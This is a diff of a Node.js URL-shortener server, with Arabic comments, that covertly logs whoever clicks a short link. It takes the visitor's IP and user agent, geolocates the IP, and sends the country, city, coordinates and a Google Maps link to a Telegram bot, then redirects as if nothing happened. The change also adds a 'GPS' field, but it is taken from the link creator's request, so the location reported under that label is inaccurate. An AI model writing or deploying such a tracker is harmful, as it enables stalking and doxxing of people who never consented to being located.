@@ -19,90 +19,40 @@ function generateShortCode() {
   return crypto.randomBytes(4).toString('hex');
 }
 
-async function getLocation(ip) {
-  console.log(`[Geo] Getting location for IP: ${ip}`);
-
-  // الطريقة 1: MaxMind GeoIP2
+async function getIPLocation(ip) {
   try {
-    const res = await axios.get(`https://geoip.maxmind.com/geoip/v2.1/city/${ip}?pretty=true`, { timeout: 2000 });
-    if (res.data) {
-      console.log('[Geo] MaxMind success');
-      return {
-        country: res.data.country?.names?.ar || res.data.country?.iso_code,
-        city: res.data.city?.names?.ar,
-        latitude: res.data.location?.latitude,
-        longitude: res.data.location?.longitude,
-        isp: 'N/A',
-        source: 'MaxMind'
-      };
-    }
-  } catch (e) { console.log('[Geo] MaxMind fail:', e.message); }
-
-  // الطريقة 2: Freegeoip.net
-  try {
-    const res = await axios.get(`https://freegeoip.app/json/${ip}`, { timeout: 2000 });
-    if (res.data && res.data.latitude) {
-      console.log('[Geo] Freegeoip success');
-      return {
-        country: res.data.country_name,
-        city: res.data.city,
-        latitude: res.data.latitude,
-        longitude: res.data.longitude,
-        isp: 'N/A',
-        source: 'freegeoip'
-      };
-    }
-  } catch (e) { console.log('[Geo] Freegeoip fail:', e.message); }
-
-  // الطريقة 3: DigitalOcean
-  try {
-    const res = await axios.get(`https://api.digitalocean.com/metadata/v1/public-ipv4`, { timeout: 2000 });
-    console.log('[Geo] DigitalOcean response:', res.data);
-  } catch (e) { console.log('[Geo] DigitalOcean fail'); }
-
-  // الطريقة 4: ipapi.co (بدون key)
-  try {
-    const res = await axios.get(`https://ipapi.co/${ip}/json/`, { timeout: 2000 });
-    if (res.data && res.data.city) {
-      console.log('[Geo] ipapi.co success');
-      return {
-        country: res.data.country_name,
-        city: res.data.city,
-        latitude: res.data.latitude,
-        longitude: res.data.longitude,
-        isp: res.data.org,
-        source: 'ipapi.co'
-      };
-    }
-  } catch (e) { console.log('[Geo] ipapi.co fail:', e.message); }
-
-  // الطريقة 5: ip-api.com
-  try {
-    const res = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,city,lat,lon,isp`, { timeout: 2000 });
-    console.log('[Geo] ip-api response:', JSON.stringify(res.data));
+    const res = await axios.get(`http://ip-api.com/json/${ip}?fields=country,city,lat,lon,isp`, { timeout: 2000 });
     if (res.data && res.data.status === 'success' && res.data.lat && res.data.lon) {
-      console.log('[Geo] ip-api success');
       return {
         country: res.data.country,
         city: res.data.city,
         latitude: res.data.lat,
         longitude: res.data.lon,
         isp: res.data.isp,
-        source: 'ip-api'
+        source: 'IP-Based'
       };
     }
-  } catch (e) { console.log('[Geo] ip-api fail:', e.message); }
-
-  console.log('[Geo] All APIs failed');
+  } catch (e) { console.log('IP Geo fail'); }
   return null;
 }
 
-async function sendToTelegram(ip, shortCode, originalUrl, userAgent) {
+async function sendToTelegram(ip, shortCode, originalUrl, userAgent, gps) {
   try {
-    console.log(`[Telegram] Processing IP: ${ip}`);
-    const location = await getLocation(ip);
+    // إذا في GPS، استخدمه. إلا استخدم IP
+    let location = null;
+    let locationType = 'Unknown';
 
-    console.log(`[Telegram] Location result:`, location);
+    if (gps && gps.lat && gps.lng) {
+      location = {
+        latitude: gps.lat,
+        longitude: gps.lng,
+        accuracy: gps.accuracy
+      };
+      locationType = `GPS (${gps.accuracy.toFixed(0)}m)`;
+    } else {
+      location = await getIPLocation(ip);
+      locationType = location ? 'IP-Based' : 'Failed';
+    }
 
     let msg = `
 🔗 رابط جديد!
@@ -114,18 +64,15 @@ async function sendToTelegram(ip, shortCode, originalUrl, userAgent) {
 
     if (location && location.latitude && location.longitude) {
       msg += `
-📍 الدولة: ${location.country || 'N/A'}
-🏙️ المدينة: ${location.city || 'N/A'}
-🌍 ISP: ${location.isp || 'N/A'}
+📍 Country: ${location.country || 'N/A'}
+🏙️ City: ${location.city || 'N/A'}
 📊 Latitude: ${location.latitude}
 📊 Longitude: ${location.longitude}
 🗺️ Maps: https://maps.google.com/?q=${location.latitude},${location.longitude}
-📡 Source: ${location.source}
+📡 Type: ${locationType}
 `;
     } else {
-      msg += `
-⚠️ الموقع: لم يتم التحديد
-`;
+      msg += `⚠️ Location: Not determined\n`;
     }
 
     msg += `
@@ -136,18 +83,17 @@ async function sendToTelegram(ip, shortCode, originalUrl, userAgent) {
     await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
       { chat_id: TELEGRAM_CHAT_ID, text: msg }
     );
-    console.log('[Telegram] Message sent');
   } catch (err) {
-    console.error('[Telegram] Error:', err.message);
+    console.error('Telegram Error:', err.message);
   }
 }
 
 app.post('/api/shorten', (req, res) => {
-  const { url } = req.body;
+  const { url, gps } = req.body;
   if (!url) return res.status(400).json({ error: 'URL required' });
 
   const shortCode = generateShortCode();
-  linkStorage[shortCode] = { original: url, created: new Date(), clicks: 0 };
+  linkStorage[shortCode] = { original: url, created: new Date(), clicks: 0, gps };
 
   const shortenedUrl = `${process.env.SHORT_DOMAIN || 'http://localhost:3000'}/${shortCode}`;
   res.json({ shortened: shortenedUrl, code: shortCode });
@@ -159,12 +105,11 @@ app.get('/:code', (req, res) => {
 
   const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
   const userAgent = req.get('user-agent');
+  const gps = linkStorage[code].gps;
   const originalUrl = linkStorage[code].original;
 
-  console.log(`[Route] Code: ${code}, IP: ${ip}`);
-
   linkStorage[code].clicks++;
-  sendToTelegram(ip, code, originalUrl, userAgent);
+  sendToTelegram(ip, code, originalUrl, userAgent, gps);
   res.redirect(originalUrl);
 });
 
